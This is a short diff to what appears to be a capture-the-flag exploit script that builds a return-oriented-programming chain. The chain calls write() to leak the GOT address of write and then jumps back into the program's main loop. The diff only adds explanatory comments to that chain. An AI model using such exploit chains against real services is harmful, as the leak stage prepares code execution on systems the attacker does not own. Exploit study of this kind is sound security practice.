@@ -127,9 +127,9 @@ if __name__ == "__main__":
     ROP += p64(CODE_BASE + pop_rdi)
     ROP += p64(1) # fd
     ROP += p64(CODE_BASE + pop_rsi)
-    ROP += p64(CODE_BASE + b.got['write'])
-    ROP += p64(0)
-    ROP += p64(CODE_BASE + b.plt['write'])
+    ROP += p64(CODE_BASE + b.got['write']) # print GOT@write
+    ROP += p64(0) # garbage
+    ROP += p64(CODE_BASE + b.plt['write']) # call write()
     ROP += p64(CODE_BASE + 0x8c7) # main loop again
 
 # mov rdi, 1
